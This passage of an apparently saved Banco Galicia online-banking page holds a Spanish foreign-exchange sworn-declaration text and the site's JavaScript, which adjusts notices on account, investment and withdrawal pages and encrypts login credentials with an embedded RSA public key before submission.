del BCRA.<br>En relación al punto 1.a) de la Com A 7030 y sucesivas, declaramos bajo juramento que la totalidad de nuestras tenencias de moneda extranjera en el país se encuentran depositadas en cuentas en entidades financieras y que no poseemos activos externos líquidos disponibles al inicio del día en que solicitamos el acceso al mercado por un monto superior equivalente a US$ 100.000 (cien mil dólares estadounidenses). Por otro lado, según punto 1.b) nos comprometemos a liquidar en el mercado de cambios, dentro de los cinco días hábiles de su puesta a disposición, aquellos fondos que recibamos en el exterior originados en el cobro de préstamos otorgados a terceros, el cobro de un depósito a plazo o de la venta de cualquier tipo de activo, cuando el activo hubiera sido adquirido, el depósito constituido o el préstamo otorgado con posterioridad al 28.05.2020.<br>En el caso de contar con activos externos líquidos disponibles por un monto superior al establecido en el párrafo anterior, declaramos bajo juramento que no se excede tal monto al considerar que, parcial o totalmente, tales activos:<br>i) fueron utilizados durante esa jornada para realizar pagos que hubieran tenido acceso al mercado local de cambios.<br>ii)    fueron transferidos a favor del cliente a una cuenta de corresponsalía de una entidad local autorizada a operar en cambios.<br>iii) son fondos depositados en cuentas bancarias del exterior que se originan en cobros de exportaciones de bienes y/o servicios o anticipos, prefinanciaciones o postfinanciaciones de exportaciones de bienes otorgados por no residentes, o en la enajenación de activos no financieros no producidos para los cuales no ha transcurrido el plazo de 5 días hábiles desde su percepción.<br>iv)   son fondos depositados en cuentas bancarias del exterior originados en endeudamientos financieros con el exterior y su monto no supera el equivalente a pagar por capital e intereses en los próximos 365 días corridos.<br>2) En relación al punto 2 de la Com A 7030 y sucesivas, para el acceso al mercado de cambios para la realización de pagos de importaciones de bienes (códigos de concepto B05, B06, B07, B10, B12, B13, B15 y B16) o la cancelación de principal de deudas originadas en la importación de bienes (código de concepto P13), declaro bajo juramento que estamos encuadrados dentro de alguna de las siguientes situaciones:<br>2.1. el monto total de los pagos asociados a nuestras importaciones de bienes cursados a través del mercado de cambios a partir del 1.1.2020, incluido el pago cuyo curso se está solicitando, no supera en más del equivalente a US$ 1.000.000 el monto por el cual tendríamos acceso al mercado de cambio al computar las importaciones de bienes que constan a nuestro nombre en el sistema de seguimiento de pagos de importaciones de bienes (SEPAIMPO) y que fueron oficializadas entre el 01.01.2020 y el día previo al acceso al mercado de cambios, más el monto de los pagos cursados en el marco de los puntos 2.2. a 2.6 no asociados a importaciones comprendidas en el punto 2.1.1., menos el monto pendiente de regularizar por pagos de importaciones con registro aduanero pendiente realizados entre el 01.09.2019 y el 31.12.2019.<br>En el monto total de pagos de importaciones de bienes asociados a sus importaciones deberán también computarse los pagos por cancelaciones de líneas de crédito y/o garantías comerciales que fueron realizados por las entidades en virtud de importaciones del cliente.<br>2.2.se trate de un pago diferido o a la vista de importaciones de bienes que correspondan a operaciones que se hayan embarcado a partir del 01.07.2020 o que habiendo sido embarcadas con anterioridad no hubieran arribado al país antes de esa fecha.<br> En el caso de pagos diferidos de importaciones oficializadas a partir del 01.01.2020, la parte que se abona de tales importaciones no ha sido previamente computada a los efectos de realizar pagos en el marco del punto 2.1.<br>2.3. se trate de un pago asociado a una operación no comprendida en el punto 2.2. en la medida que sea destinado a la cancelación de una deuda comercial por importaciones de bienes con una agencia de crédito a la exportación o una entidad financiera del exterior o que cuente con una garantía otorgada por las mismas. En el caso de tratarse de pagos de importaciones oficializadas a partir del 01.01.2020, la parte que se abona de tales importaciones no ha sido previamente computada a los efectos de realizar pagos en el marco del punto 2.1.<br>2.4. se trate de un pago por: i) sector público, ii) todas las organizaciones empresariales, cualquiera sea su forma societaria, en donde el Estado Nacional tenga participación mayoritaria en el capital o en la formación de las decisiones societarias o iii) los fideicomisos constituidos con aportes del sector público nacional.<br>2.5. se trate de un pago con registro de ingreso aduanero pendiente a cursar por una persona jurídica que tenga a su cargo la provisión de medicamentos críticos a ingresar por Solicitud Particular por el beneficiario de dicha cobertura médica.<br>2.6. se trate de un pago de importaciones con registro aduanero pendiente destinado a la compra de kits para la detección del coronavirus COVID-19 u otros bienes cuyas posiciones arancelarias se encuentren comprendidas en el listado dado a conocer por el Decreto N° 333/2020 y sus complementarias.<br>2.7 se trate de otros pagos de importaciones de bienes, declarando bajo juramento que, incluyendo el pago anticipado cuyo curso se está solicitando, no supera el equivalente a US$ 3.000.000 (tres millones de dólares estadounidenses) del monto que surge al considerar los puntos 2.1.1. a 2.1.3. y se trata de pagos para la importación de productos relacionados con la provisión de medicamentos u otros bienes relacionados con la atención médica y/o sanitaria de la población o insumos que sean necesarios para la elaboración local de los mismos.<br>Por medio de la presente y en referencia a la Comunicación A 7030 punto 4 y sucesivas, declaramos bajo juramento que en la fecha y en los 90 días corridos anteriores no hemos concertado en el país ventas de títulos valores con liquidación en moneda extranjera o transferencias de los mismos a entidades depositarias del exterior (excepto por aquellas realizadas con el objeto de participar en el proceso de canje de títulos públicos abierto por el Gobierno Nacional o el Gobierno de la Provincia de Buenos Aires). Al mismo tiempo, nos comprometemos a no realizar este tipo de operaciones a partir del momento en que accedemos al mercado y por los 90 días corridos subsiguientes.<br>En el caso de haber realizado operaciones de títulos valores con el objeto de participar en el proceso de canje de títulos públicos abierto por el Gobierno Nacional o de la Provincia de Buenos Aires, nos comprometemos a presentar la correspondiente certificación de los bonos canjeados.<br>Que la información consignada en el presente formulario es exacta y verdadera en los términos previstos por el Régimen Penal Cambiario, y que; la documentación presentada para avalar esta operación es genuina no ha sido canalizada ni se cursará a través de ningún otro medio y los fondos provienen de actividades lícitas. Me/nos obligo/amos expresamente a colaborar con el Banco mediante el suministro de información, la entrega de documentación e informes, así como con la provisión de todos aquellos datos que sean necesarios y/o convenientes para que el Banco pueda dar acabado cumplimiento a las normas mencionadas en el plazo de 72 horas. <br>Tomo/amos conocimiento de que Banco de Galicia y Buenos Aires S.A.U se encuentra facultado a requerirme/nos toda la información necesaria para dar cumplimiento a las normas nacionales e internacionales sobre prevención del lavado de dinero y financiamiento del terrorismo (leyes n° 25.246 y n° 26.024, decretos, comunicaciones del Banco Central de la República Argentina, Resoluciones de la Unidad de Información Financiera, sus concordantes y complementarias.) Por lo expuesto, autorizo/autorizamos expresamente a Banco de Galicia y Buenos Aires S.A.U a realizar todos los controles y verificaciones que estime convenientes, a través de los medios que considere más eficaces, para dar cumplimiento a la normativa legal y reglamentaria vigente y a los estándares internacionales aceptados sobre Prevención del lavado de dinero y de otras actividades ilícitas y Prevención del financiamiento del terrorismo. <br>Dejamos expresa constancia que la presente no se encuentra relacionada ni directa ni indirectamente con persona humana y/o jurídica, pública o privada que pudiera tener vínculos con cualquier persona o entidad que pudiera considerarse vinculada a un régimen ilegítimo. En tal sentido y en ocasión del procedimiento anteriormente mencionado, reconozco/reconocemos que ese Banco tendrá la facultad de no cursar la operación solicitada en caso que considere vulneradas dichas normas estándares, con la debida notificación al ordenante de la transferencia, sin que ello genere en tal caso responsabilidad alguna a la Entidad. Así mismo, cuando los fondos sean incautados, embargados, retenidos, bloqueados o que por razones de Compliance o por cualquier otra causa se impida o demore la liquidación de las operaciones o no pueda acreditarse la transferencia al Beneficiario del Exterior, el Banco no será responsable, desistiendo expresamente el solicitante de reclamar cualquier gasto, daño, perjuicio, lucro cesante o intereses que dichas circunstancias puedan ocasionarle.<br>Esta operación se efectivizara considerando el tipo de cambio vigente al momento de su liquidación para este tipo de transacciones. El Banco de Galicia y Buenos Aires S.A.U no será responsable por demoras en el cierre de cambio, liquidación pago al exterior, derivadas del hecho de cualquier autoridad de aplicación cuya intervención deba ser requerida o que deba participar del procesamiento de la operación o que se originen en cualquier circunstancia fuera de su control. Declaro/amos expresamente que la operación arriba mencionada quedará perfeccionada con el cierre de cambio, canje y/o arbitraje y su correspondiente liquidación, la cual será realizada de acuerdo con los tiempos que demore el proceso operativo de la operación solicitada. En virtud de lo expuesto, asumo/mimos las consecuencias de los cambios normativos que puedan afectar el procesamiento de la operación al momento de su instrumentación, liberando al Banco de Galicia y Buenos Aires S.A.U de toda responsabilidad. Quedan a cargo del solicitante los gastos que se originen en consultas o aclaraciones que hubiera que hacer sobre los datos consignados en esta solicitud. En caso de solicitarse la anulación de esta operación, el Banco abonará en pesos el equivalente de la moneda extranjera al tipo de cambio comprador que rija el día en que se efectúe la devolución de acuerdo con las disposiciones en vigencia en ese momento y una vez obtenida la conformidad de anulación del Corresponsal interviniente y el crédito en cuenta de fondos libres. Esta entidad cumple con lo requerido en el artículo 12 de la Ley 25.326: <br>1. Es prohibida la transferencia de datos personales de cualquier tipo con países u organismos internacionales o supranacionales, que no proporcionen niveles de protección adecuados. <br>2. La prohibición no regirá en los siguientes supuestos: Transferencias bancarias o bursátiles, en lo relativo a las transacciones respectivas y conforme la legislación que les resulte aplicable. <br>La moneda de la solicitud de transferencia podrá convertirse a la moneda de curso legal en el país destino de los fondos, conforme al tipo de cambio fijado por el banco corresponsal/pagador correspondiente al momento de la conversión. Se deja constancia que, con la firma del presente, el cliente acepta y reconoce que el banco procesara la operación conforme a los datos que se hayan completado en éste y no será responsable por los errores u omisiones que se pudieran haber cometido al completar el mismo por parte del cliente. Por las operaciones de cierre de cambio, el Banco podrá percibir una comisión de US$ 30 (dólares estadounidenses treinta) por la revisión y el análisis personalizado de la documentación física presentada. Con la firma del presente, consiento/consentimos expresamente tal comisión y aceptamos que la misma sea debitada de mi/nuestra cuenta informada en esta solicitud. Reconozco/cemos expresamente el derecho de Banco de Galicia y Buenos Aires S.A.U a dar por concluida cualquier vinculación comercial o contractual que mantuviere conmigo/nosotros en caso de reticencia de mi/nuestra parte a presentar la información o documentación que éste requiriere, sin derecho a efectuar reclamo alguno por ello. <br>Tomo conocimiento que la falsedad en la presente Declaración jurada me hace pasible de las sanciones establecidas en el Régimen Penal Cambiario establecido por ley 19.359 y sus modificatorias.<br>Asumo el compromiso de mantener indemne y liberar de toda responsabilidad al Banco de Galicia y Buenos Aires S.A.U por cualquier daño y/o reclamo futuro que pudiera estar originado en una falsedad consignada en la presente declaración.'
document.querySelector("body > div.container-fluid.out > div.main > div.row.full-h > div > div > p:nth-child(3)").innerHTML = "";
document.querySelector("body > div.container-fluid.out > div.main > div.row.full-h > div > div > p:nth-child(4)").innerHTML ="";
document.querySelector("body > div.container-fluid.out > div.main > div.row.full-h > div > div > p:nth-child(3)").innerHTML = element.innerHTML;
}


 if(window.location.pathname == '/inversiones/inicio'){

 $(document).ajaxComplete(function( event, xhr, settings ) {
        if ( settings.url === "/Inversiones/GetPartialSidedrawerPlazoFijo" ) {   
var tipoPlazo = document.getElementById( 'SideBarPerfilPlazoFijo' ).getElementsByTagName( 'p' )[1].textContent;
var leyenda = document.querySelector("#SideBarPerfilPlazoFijo > div > div > div > p.f-size-12.text-grey.push-top-xs-15.push-top-10.notSensible") 
if(tipoPlazo == 'Tradicional'){
 $(leyenda).text('Recordá que podés cambiar la acción al vencimiento a través de Online Banking hasta un día hábil antes de la fecha de finalización del plazo, siempre que el mismo haya sido realizado por este canal o por la App. Si no podés cambiar la acción, comunicate con tu oficial o acercate a la sucursal más cercana.')    
} 
        }
    });

var overview = document.querySelector(".perfil-overview");
overview.insertBefore(element,overview.firstElementChild);

    $(document).ajaxComplete(function( event, xhr, settings ) {
       if ( settings.url === "/inversiones/ObtenerInversionesPorCuentasComitentes" ) {  
//Cambio blankstate error fima
 $('div[data-error-section="fondos-fima"]').each(function () {
     $('div[data-error-section="fondos-fima"] p:nth-child(2)').html("<strong>Ahora no podemos mostrarte el detalle de los fondos Fima</strong>");
      $('div[data-error-section="fondos-fima"] p:nth-child(3)').html("Por consultas, podés comunicarte con tu ejecutivo, escribirnos por redes o enviarnos un mail a <a href='mailto:bancogalicia@bancogalicia.com.ar'>bancogalicia@bancogalicia.com.ar</a>. Sabemos que te causamos inconvenientes, disculpanos. Estamos trabajando para solucionar el problema.");
    
 })
//Fin Cambio blankstate error fima
     }
  });        
}

//aviso compra/venta bya
if(window.location.pathname == '/inversiones/compraventa_bonos_acciones'){
var element = document.createElement("div");
element.innerHTML = "<div class='col-xs-12 alert-box push-top-xs-10 push-bottom-5 push-bottom-xs-10'><div class='box-user alert-border alert-border-yellow cursor-d no-shadow no-margin-bottom'><i class='icon-left icon-info-yellow pull-left'></i><div class='box-content no-padding-right push-left-20'><div class='alert-description no-padding push-top-xs-10'><p>De acuerdo a las nuevas comunicaciones del BCRA:</p><ul class='push-left-15 push-top-xs-5'><li><p class='text-grey'><span class='bold-text text-black push-top-5 no-margin-bottom'>Compra de títulos en dólares:</span>sí compraste dólares en el Mercado Único y Libre de Cambios no podrás comprar títulos en dólares por 90 días.</p></li><li><p class='text-grey'><span class='bold-text text-black push-top-5 no-margin-bottom'>Venta de títulos en dólares:</span> Para operar necesitas cumplir estos requisitos: no haber comprado dólar solidario, no poseer un préstamo con subsidio, no tener refinanciaciones de tarjetas ni de préstamos. Además tenés que esperar 1 día hábil para venderlos en una moneda distinta a la de compra.</p></li></ul></div></div></div></div>";
var form = document.querySelector("#divPantalla");
form.insertBefore(element,form.firstElementChild);
}

if(window.location.pathname == '/inversiones/compraventa_bonos_acciones'){
    $(document).ajaxComplete(function( event, xhr, settings ) {
        if ( settings.url === "/inversiones/cargar-configuracion-especie" ) {
            
        var leyenda = document.createElement("P");                     
        var text = document.createTextNode("");   
        leyenda.appendChild(text);       
        document.getElementById("divPlazos").children[2].appendChild(leyenda);
        $(leyenda).addClass('leyenda-plazo f-size-12 no-margin-bottom bold-text')
     
         $(".opcionComboPlazo").on('click', function (event) {
            if ($("#PlazoSeleccionado").val() == "0"){   
            $('.leyenda-plazo').text('Importante: no podrás operar con este plazo a partir de las 16:00hs.')  
         }else{
          $('.leyenda-plazo').text('')
         }
         })   
            
        }
    });
}

if(window.location.pathname.toLowerCase() == '/turnos/solicitud' || window.location.pathname.toLowerCase() == '/turnos/exito' || window.location.pathname.toLowerCase() == '/turnos/horario')
{
    if ($("a[onclick=\"window.location.href='/inicio'\"]").length) 
    { 
        $('.btn-back').remove();
        $('#cancellationFlowButton').remove();
        $('a.logo').removeAttr("href").removeAttr("target");
    }
}

if(window.location.pathname == '/orden-extraccion/carga-monto')
{
    document.querySelector("#HelpContentContainer > div > div > div > ul:nth-child(9) > li:nth-child(2) > span").textContent = "";
    document.querySelector("#HelpContentContainer > div > div > div > ul:nth-child(9) > li:nth-child(2) > span").textContent = "El mínimo de extracción son $100 y el máximo $15.000.";
    document.querySelector("#HelpContentContainer > div > div > div > ul:nth-child(9) > li:nth-child(2) > span").textContent = "";
    document.querySelector("#HelpContentContainer > div > div > div > ul:nth-child(9) > li:nth-child(2) > span").textContent = "El mínimo de extracción son $100 y el máximo $15.000.";
    document.querySelector("#HelpContentContainer > div > div > div > p:nth-child(2)").textContent = "";
    document.querySelector("#HelpContentContainer > div > div > div > p:nth-child(2)").textContent = "Para que vos, u otra persona que autorices, puedan extraer dinero sin tarjeta, desde cualquier cajero automático.";
    document.querySelector("#HelpContentContainer > div > div > div > ul:nth-child(9) > li:nth-child(1) > span").textContent ="";
    document.querySelector("#HelpContentContainer > div > div > div > ul:nth-child(9) > li:nth-child(1) > span").textContent ="La orden de extracción vence el día después de generada a las 23:59hs desde cualquier cajero automático."
    document.querySelector("#HelpContentContainer > div > div > div > ul:nth-child(9) > li:nth-child(5)").style.display = "none";
    document.querySelector("#txtCajero").textContent = "";
    document.querySelector("#txtCajero").textContent = "Recordá que esta orden se podrá retirar en cualquier cajero automático.";
}

if(window.location.pathname == '/orden-extraccion/beneficiario')
{
    document.querySelector("#HelpContentContainer > div > div > div > ul:nth-child(9) > li:nth-child(2) > span").textContent = "";
    document.querySelector("#HelpContentContainer > div > div > div > ul:nth-child(9) > li:nth-child(2) > span").textContent = "El mínimo de extracción son $100 y el máximo $15.000.";
    document.querySelector("#HelpContentContainer > div > div > div > ul:nth-child(9) > li:nth-child(2) > span").textContent = "";
    document.querySelector("#HelpContentContainer > div > div > div > ul:nth-child(9) > li:nth-child(2) > span").textContent = "El mínimo de extracción son $100 y el máximo $15.000.";
    document.querySelector("#HelpContentContainer > div > div > div > p:nth-child(2)").textContent = "";
    document.querySelector("#HelpContentContainer > div > div > div > p:nth-child(2)").textContent = "Para que vos, u otra persona que autorices, puedan extraer dinero sin tarjeta, desde cualquier cajero automático.";
    document.querySelector("#HelpContentContainer > div > div > div > ul:nth-child(9) > li:nth-child(1) > span").textContent ="";
    document.querySelector("#HelpContentContainer > div > div > div > ul:nth-child(9) > li:nth-child(1) > span").textContent ="La orden de extracción vence el día después de generada a las 23:59hs desde cualquier cajero automático."
    document.querySelector("#HelpContentContainer > div > div > div > ul:nth-child(9) > li:nth-child(5)").style.display = "none";
}

if(window.location.pathname == '/orden-extraccion/confirmacion')
{
    document.querySelector("body > div.container-fluid > div.main > div.row.full-h > div.content-section.middle-view-content.txs.exito-view.no-effect > div > div > p.no-margin-bottom.push-left-30.push-top-10").textContent = "";
    document.querySelector("body > div.container-fluid > div.main > div.row.full-h > div.content-section.middle-view-content.txs.exito-view.no-effect > div > div > p.no-margin-bottom.push-left-30.push-top-10").textContent = "Para retirar el dinero, acercate a un cajero automático,";
}

if(window.location.pathname == '/orden-extraccion/preconfirmacion')
{
    document.querySelector("#form1 > div > div.row > div:nth-child(8) > h3 > strong").textContent = "";
    document.querySelector("#form1 > div > div.row > div:nth-child(8) > h3 > strong").textContent = "Cajeros automáticos";
}


if(window.location.pathname == '/transferencias/transferencia-preconfirmacion')
{
    if(document.querySelector("#form1 > div.row.md > div:nth-child(5) > h3 > strong").textContent.indexOf("U$D") == 0){
        var element = document.createElement("div");
        element.innerHTML ="<div class='col-xs-9 alert-box push-top-xs-5 push-top-10 push-bottom-15 no-padding-left'><div class='box-user alert-border alert-border-blue cursor-d no-shadow no-margin-bottom'><i class='icon-left icon-info-blue pull-left'></i><div class='box-content no-padding-right push-left-20'><p class='alert-title f-size-20' data-hj-masked=''>Antes de transferir en dólares<br/></p><div class='alert-description text-grey'><span class='no-margin-bottom'>Es importante que sepas que la acreditación del dinero de la cuenta del destinatario<br> podrá tardar más de lo habitual o ser rechazada, según la Com. A7072 del BCRA.</span></div></div></div></div><div class='clearfix'></div>";

        var form = document.querySelector("#form1");
        form.insertBefore(element,form.firstElementChild);
    }
}

if(window.location.pathname == '/cuentas/mis-cuentas' ){

    if (document.querySelector("body > div.container-fluid > div.main > div.row.full-h > div.col-xs-12.page-header.highlight.account > div.content > div > div.col-sm-4.text-center.hidden-xs > span") == null){ //no es un cuenta proyecto
        if (document.querySelector("body > div.container-fluid > div.main > div.row.full-h > div.col-xs-12.page-header.highlight.account > div.content > div > div:nth-child(3) > span") == null){ // no es un cuenta corriente

            var letrero = '<div class="col-xs-12 alert-box push-top-xs-5 push-top-10 no-padding-left "><div class="box-user alert-border alert-border-yellow cursor-d no-shadow" style="margin-bottom:30px"><i class="icon-left icon-info-yellow pull-left"></i><div class="box-content no-padding-right push-left-20"><p class="alert-title" style="margin-bottom: 0px;" data-hj-masked="">¿Usás tu tarjeta de débito los viernes, sábados y domingos?</p><div class="alert-description text-grey"><p class="no-margin-bottom push-right-20">Tus consumos de esos dias van a aparecer acá los lunes.</p></div></div></div></div><div class="clearfix"></div>';
            document.querySelector("body > div.container-fluid > div.main > div.row.full-h > div:nth-child(3) > div.perfil > div").insertAdjacentHTML("afterbegin",letrero);    
        }
    }     
}

if(window.location.pathname == '/VerDebitosAutomaticos' ){
$(document).ajaxComplete(function( event, xhr, settings ) {
    var elementosDA = document.getElementById("debitosContainer")
    if (elementosDA.childElementCount>0){
    for (var i = 0; i < elementosDA.childElementCount; i++) {
    if(elementosDA.children.item(i).innerText.toLowerCase() == "mot.desco."){
    elementosDA.children.item(i).hidden = true
    }}}});}

if(window.location.pathname == "/cuentas/inicio"){
var cajas_segs_divs = document.querySelectorAll('.box_caja_seg'), i;

for (i = 0; i < cajas_segs_divs.length; ++i) {
 $(cajas_segs_divs[i]).find("h4").text("");
 $(cajas_segs_divs[i]).height(230);
 if ($(cajas_segs_divs[i]).find("h3").find("span").html() != "Sin deuda pendiente"){ var deuda_cs = $(cajas_segs_divs[i]).find("h3").find("span").html(); $(cajas_segs_divs[i]).find("h3").find("span").html("Deuda pendiente: "+ deuda_cs)}
}
//sidedrawer
document.querySelector("#sideBarDetalleCajaDeSeguridad > div > div > div > span:nth-child(7)").innerText =""
$('.box_caja_seg').click(function(){
    document.querySelector("#importe").innerText="";
});
}

if(window.location.pathname == '/seguridad/generar-clave-ingresar-du'){
$(".content-section").empty()
$(".content-section").addClass("xs")
$(".content-section.xs").append('<div class="col-xs-12 centered error-view"></div>')
$(".col-xs-12.centered.error-view").append('<div class="divaux"></div>')
$(".divaux").append("<div  class='content-msg-xs'></div>")
$(".content-msg-xs").append('<p class="icon icon-svg error"></p>')
$(".icon.icon-svg.error").after('<h5 class="error error2">Ahora no podemos crear tu Clave Galicia</h5>')
$(".error2").after('<p class="description error">                    No te preocupes, vas a poder crear tu clave llamando a Fonobanco al <b>0810-444-6500</b>.                    <br />                    También podés hacerlo en un <b>cajero automático o terminal de autoservicio de la red Galicia</b>, con tu tarjeta Galicia débito.                </p>')
$(".divaux").append('<div class="clearfix"></div>')
$(".divaux").append('<input id="Button1" type="button" onclick="window.location.href=\'/login\'" value="ENTENDIDO" class="btn btn-md-listo bottom only" />')
}
 
if(window.location.pathname == '/gestion/primer-ingreso-inicio'){
$(".content-section").empty()
$(".content-section.xs").append('<div class="col-xs-12 centered error-view"></div>')
$(".col-xs-12.centered.error-view").append('<div class="divaux"></div>')
$(".divaux").append("<div  class='content-msg-xs'></div>")
$(".content-msg-xs").append('<p class="icon icon-svg error"></p>')
$(".icon.icon-svg.error").after('<h5 class="error error2">Ahora no podemos crear tu Clave Galicia</h5>')
$(".error2").after('<p class="description error">                    No te preocupes, vas a poder crear tu clave llamando a Fonobanco al <b>0810-444-6500</b>.                    <br />                    También podés hacerlo en un <b>cajero automático o terminal de autoservicio de la red Galicia</b>, con tu tarjeta Galicia débito.                </p>')
$(".divaux").append('<div class="clearfix"></div>')
$(".divaux").append('<input id="Button1" type="button" onclick="window.location.href=\'/login\'" value="ENTENDIDO" class="btn btn-md-listo bottom only" />')
}
 
if (window.location.pathname == '/gestion/primer-ingreso-pregunta-personal'){
window.location.href =  '/gestion/primer-ingreso-inicio'
} } catch(e) { }


            if (sessionStorage.getItem('LinkExterno')) {
                //MANEJO DE ENLACES CUANDO SE ACCEDE DESDE UN PORTAL EXTERNO
                $('.logo').removeAttr('href');
                $('#btnCerrar, .page-header .icon-close, #cancellationFlowButton').attr('href', 'javascript:window.close();');
                $('.error-view #Button1, .exito-view #Button1').attr('onclick', 'javascript:window.close();');
            }
        });

    </script>

    
    <script type="text/javascript" language="javascript">
        //flag para evitar doble submit en el login simplificado al hacerlo con enter
        var remember = 'False' == 'True'? true : false;

        var processedLogin = false

		var refreshL = true;
         // Variable que se utiliza dentro del KeyBoard.Js
        var showKeyboard = false;

        function refreshLogin() {
            window.location.reload();
        }

        function validateForm(validator) {            
            if (remember) {
                if (validator.numberOfInvalids() == 0 && $('#Password').val().length > 3) {
                    if(!processedLogin){
                        $('#submitButton').removeAttr('disabled');
                    }
                }
                else {
                    $('#submitButton').prop('disabled', 'true');
                }
            }
            else {
                if (validator.numberOfInvalids() == 0
                && $('#DocumentNumber').length > 0 && $('#DocumentNumber').val().length > 3
                && $('#UserName').length > 0 && $('#UserName').val().length > 1
                && $('#Password').val().length > 3) {
                    if(!processedLogin){
                        $('#submitButton').removeAttr('disabled');
                    }   
                }
                else {
                    $('#submitButton').prop('disabled', 'true');
                }
            }

        }

        function validateInput(object, event, regEx) {
            maxLengthCheck(object);

            return ValidateRegExOnEvent(event, regEx);
        }

        function maxLengthCheck(object) {
            if (object.value.length > object.maxLength)
                object.value = object.value.slice(0, object.maxLength)
        }

		$(document).ready(function () {

            //Se eliminan variables del sessionStorage
            sessionStorage.setItem(
                'cardIndex',
                null
            );

            $('#popupErrorCredenciales').on('hidden.bs.modal', function () {
                unblockInputs();
                if (remember)
                    $("#Password").first().focus();
                else
                    $("#DocumentNumber").first().focus();
            });

            $("#DocumentNumber").on("drop paste", function () {
                var target = $(this);

                setTimeout(function () {
                    //get the value of the input text
                    var data = target.val();
                    //replace the special characters to ''
                    var dataFull = data.replace(regEx_alpha, '');

                    //set the new value of the input text without special characters
                    target.val(dataFull);
                });
            }).on('keydown', function (e) {
                if ((e.keyCode || e.which) == 38 || (e.keyCode || e.which) == 40) {
                    e.preventDefault();
                }
            });

            $("#DocumentNumber").on("input", function () {
                $('#RememberMe').prop("checked", false);
            });

            $("#Password").on("paste", function () {
                var target = $(this);

                setTimeout(function () {
                    //get the value of the input text
                    var data = target.val();
                    //replace the special characters to ''
                    var dataFull = data.replace(regEx_alpha, '');

                    //set the new value of the input text without special characters
                    target.val(dataFull);
                });
            });

            closeAlert();

            $('[data-toggle="tooltip"]').tooltip();

            try {
                $.validator.setDefaults({
                    highlight: function (element) {
                        $(element).closest('.inputArea').addClass('invalid');
                    },
                    unhighlight: function (element) {
                        $(element).closest('.inputArea').removeClass('invalid');
                    },
                    messageTarget: 'data-original-title',
                    errorElement: 'div',
                    errorClass: 'errorMsg',
                    errorPlacement: function (error, element) {
                        //Solo se fireaba una vez
                        error.attr('data-toggle', 'tooltip');
                        error.attr('data-placement', 'top');
                        error.insertAfter(element);

                        error.tooltip();
                    }
                });

                var validator = $("#form1").validate({ // initialize the plugin
                    onkeyup: function (element, event) {
                        var idElemento = $(element).attr('id');

                        if (idElemento == "UserName") {
                            if ($(element).val().length > 1) {
                                $(element).valid();
                            }
                        }
                        else if (idElemento == "Password") {
                            if ($(element).val().length > 3) {
                                $(element).valid();
                            }
                        }
                        else if (idElemento == "DocumentNumber") {
                            if ($(element).val().length > 3) {
                                $(element).valid();
                            }
                        }

                        validateForm(validator);
                    },
                    onfocusout: function (element) {
                        $(element).valid();
                        validateForm(validator);
                    },
                    invalidHandler: function () {
                        validateForm(validator);
                    }
                });

                setRulesLogin();

                setTimeout(function () {
                    $('#submitButton').prop('disabled', 'true');
                });



            }
            catch (e) { }

            document.getElementById("DevicePrintAdaptive").value = encode_deviceprint();

            if (remember)
                $("#Password").first().focus();
            else
				$("#DocumentNumber").first().focus();
        });

        function SubmitLoginForm() {
        
            processedLogin = true;

            $('#submitButton').prop('disabled', 'true');

            //En caso que el Teclado Virtual se este visualizando, lo cerramos
                 document.getElementById("simpleKeyboard").style.display = "none";
                 document.getElementById("keyboardIcon").style.color = "#666666";
                 showKeyboard = false;
            
            //Antes de realizar el submit borro el intervalo
			if ($('#Password').val() != "" && $('#Password').val().length == 4 && (remember || $('#UserName').val() != "" && $('#DocumentNumber').val() != "")) {
					 cmdEncrypt();
			}

		}

		function cmdEncrypt() {
            setMaxDigits(131);
            key = new RSAKeyPair("010001", "", "A6EF15DBE9527262B0A888B6089A4AABED76142A511A6DD46E1D370F5A13EF33CBE56FF956848D7AEDB0E95FED440392B931D83A932755B9663B2F987C6E7948FA6B09C789D31854AA3B30B2B10E522E4A9F8F8F27EE4E0AE8F559EF170F447FC8B2E3EE118319CA73E377097517FFC182756C34A0020C725AF11B0D94F65255");

            var userName = "null";
            if ($('#UserName').length != 0)
                userName = $('#UserName').val();

			var enc = encryptedString(key, "FGi6cflTC2rpJbVbl250PKT4Goo=" + "\\" + base64encode(base64encode(userName) + "\\" + base64encode($('#Password').val())));

			$('#EncriptedPassword').val(enc);

			setDummyDataAndSubmit();

		}

		 function AESDataEncrypt() {

			var data = $('#UserName').val() + "\\" + $('#Password').val();

			var encryptedData;

			encryptedData = AES_CBC_Encrypt(data, "");

			$('#EncriptedPassword').val(encryptedData);

			setDummyDataAndSubmit();

		}

		function setDummyDataAndSubmit() {

			$('#Password').val("0000");

			var userName = "";

			if ($('#UserName').length != 0) {
				userName = $('#UserName').val();
				var l = userName.length;
				var dummyUserName = "";
				for (var i = 0; i < l; i++) {
					dummyUserName += "0";
				}
				$('#UserName').val(dummyUserName);
			}

			 $('#form1').submit();
		 }

        function evalEnter(e) {
            if (e.keyCode == 13 && (remember || document.getElementById('DocumentNumber').readOnly == false) && !processedLogin) {
                SubmitLoginForm();
            }
        }

        function enableDebug() {
            document.getElementById('isDebugEnabled').value = true;

            SubmitLoginForm();
        }

        function blockInputs() {
            if (remember) {
                document.getElementById('DocumentNumber').readOnly = true;
                document.getElementById('UserName').disabled = true;
            }
            document.getElementById('Password').disabled = true;
        }

        function unblockInputs() {
            if (remember) {
                document.getElementById('DocumentNumber').readOnly = false;
                document.getElementById('UserName').disabled = false;
            }
            document.getElementById('Password').disabled = false;
        }
    </script>
    <script type="text/javascript" src="./index_files/Scripts/simple-keyboard.min.js"></script>
<script src="./index_files/Scirpts/polyfill.js" type="text/javascript"></script>
    <script src="./index_files/Scripts/keyboard.js" type="text/javascript"></script>



